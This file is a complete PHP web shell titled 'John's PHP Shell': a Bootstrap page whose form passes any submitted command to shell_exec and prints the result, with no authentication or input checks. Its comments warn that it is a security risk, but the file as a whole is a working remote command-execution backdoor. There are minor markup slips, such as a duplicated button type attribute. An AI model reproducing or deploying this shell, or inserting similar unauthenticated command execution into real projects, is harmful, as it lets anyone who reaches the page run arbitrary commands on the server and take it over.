<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>John's PHP Shell</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>

<body class="bg-dark text-white">
    <header class="bg-primary text-white p-3">
        <div class="container">
            <h2 class="mb-0">John's PHP Shell</h2>
        </div>
    </header>
    <main class="container mt-4">
            <div class="col-md-6 offset-md-3">
                <form method="POST" action="" clsaa="col">
                    <div class="input-group mb-3">
                        <input type="text" class="form-control" placeholder="Command: eg: ls -la" name="cmd"
                            aria-label="Recipient's username" aria-describedby="button-addon2" id="cmd">
                        <button class="btn btn-primary" type="button" id="button-addon2" type="submit">Execute</button>
                    </div>
                </form>

            </div>
    </main>
    <div class="container">
        <?php
            // this is a simple PHP shell that allows you to execute commands on the server
            // WARNING: This is a security risk and should not be used in production environments
            // Use at your own risk
            // Make sure to sanitize the input and validate the commands before executing them
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
                $command = $_POST['cmd'];
                $output = shell_exec($command);
                echo "<pre>" . htmlspecialchars($output) . "</pre>";
            } else {
                echo "<p>Please enter a command to execute.</p>";
            }
        ?>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js">
    </script>

</body>

</html>
